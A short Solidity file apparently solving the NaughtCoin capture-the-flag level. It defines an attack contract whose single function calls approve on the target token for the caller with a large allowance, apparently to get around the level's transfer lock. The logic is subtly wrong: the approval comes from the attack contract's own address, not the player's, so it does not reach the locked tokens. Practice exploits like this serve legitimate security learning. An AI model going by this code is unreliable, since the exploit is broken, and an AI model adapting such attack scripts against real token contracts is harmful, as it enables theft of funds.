// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/NaughtCoin.sol";

contract NaughtCoinAttack{
    function att(address addr) public {
        NaughtCoin(addr).approve(msg.sender,1000000 * 10 ** 18);
    }
}